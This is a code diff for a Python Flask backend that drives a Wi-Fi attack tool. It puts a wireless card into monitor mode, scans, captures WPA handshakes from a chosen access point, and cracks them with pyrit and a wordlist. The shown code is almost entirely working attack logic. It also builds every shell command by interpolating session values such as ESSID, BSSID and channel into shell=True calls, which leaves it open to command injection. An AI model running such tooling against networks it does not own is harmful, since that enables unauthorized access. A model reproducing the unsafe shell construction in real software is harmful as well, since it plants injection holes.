@@ -13,14 +13,18 @@ from app.utils import *
 
 @app.get('/')
 def index():
+    path = config['server']['filePath']
+    session["path"] = path
+    mkdir = f'mkdir {path}'
+    subprocess.run(mkdir, check=True, shell=True, capture_output=True)
     return ret({"status":"OK"})
 
 @app.get('/netcard')
 def getNetcardMon():
-    bash_command = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
-    output = subprocess.run(bash_command, check=True, shell=True, capture_output=True)
+    listNetcards = 'iwconfig 2>&1 | grep "ESSID" | while read netcard text; do echo "$netcard"; done'
+    output = subprocess.run(listNetcards, check=True, shell=True, capture_output=True)
     
-    return ret({"cards": f"{output.stdout}"})
+    return ret({"cards": f"{output.stdout.decode()}"})
 
 @app.post('/netcard')
 def setNetcardMon():
@@ -49,16 +53,15 @@ def stopNetcardMon():
     stopServices = f'killall airodump-ng | airmon-ng stop {netcardMon} && systemctl start NetworkManager.service'
     subprocess.run(stopServices, check=True, shell=True)
 
-    clean(path)
-    clean(path, True)
+    #clean(path)
+    #clean(path, True)
 
     return ret({"status":"OK"})
 
 @app.get('/scan')
 def scan():
     netcardMon = session.get('netcardMon') 
-    path = config['server']['filePath']
-    session["path"] = path
+    path = session.get('path')
 
     startScan = f'airodump-ng -w {path}/dumpData --output-format csv {netcardMon} > /dev/null'
     subprocess.Popen(startScan, shell=True)
@@ -89,7 +92,7 @@ def attack(id):
     scanAttack = True
 
     
-    startScan = f'airodump-ng -w {path}/dumpDataAttack --channel {channel} {netcardMon} > {path}/tempScan'
+    startScan = f'airodump-ng -w {path}/dumpDataAttack -c {channel} --bssid {bssid} {netcardMon} > {path}/tempScan'
     subprocess.Popen(startScan, shell=True)
 
     sleep(3)
@@ -142,9 +145,7 @@ def attack(id):
 
     subprocess.run(attack, check=True, shell=True)
     
-    scanAttack = True
     waitHandshake()
-    scanAttack = False
     
     #Finish scan
     stopNetcardMon()
@@ -156,17 +157,12 @@ def attack(id):
     if checkHandshake.returncode == 1:
         return ret({"status":"HS not captured"}, 400)
 
-
-    #Extraer handshake
-    extractHash = f"aircrack-ng -J {path}/captureHS {path}/dumpDataAttack-01.cap && hccap2john {path}/captureHS.hccap > {path}/hash"
-    subprocess.run(extractHash, check=True, shell=True)
-
     return ret({"status":"OK"})
 
 ###Cracking
 
 ##Cracking con Pyrit a través de ataque por Base de Datos RAINBOW TABLE
-@app.post('/crack/<string:wordlist>')
+@app.get('/crack/<string:wordlist>')
 def cracker(wordlist):
     path = session.get('path')
     essid = session.get('essid')
@@ -184,7 +180,7 @@ def cracker(wordlist):
     subprocess.run(generatePMKS, check=True, shell=True)
 
     #Start cracking
-    startCrack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > {essid}'
+    startCrack =  f'pyrit -r {path}/dumpDataAttack-01.cap attack_db > passDB/{essid}'
     subprocess.run(startCrack, check=True, shell=True)
 
     return ret({"status":"OK"})
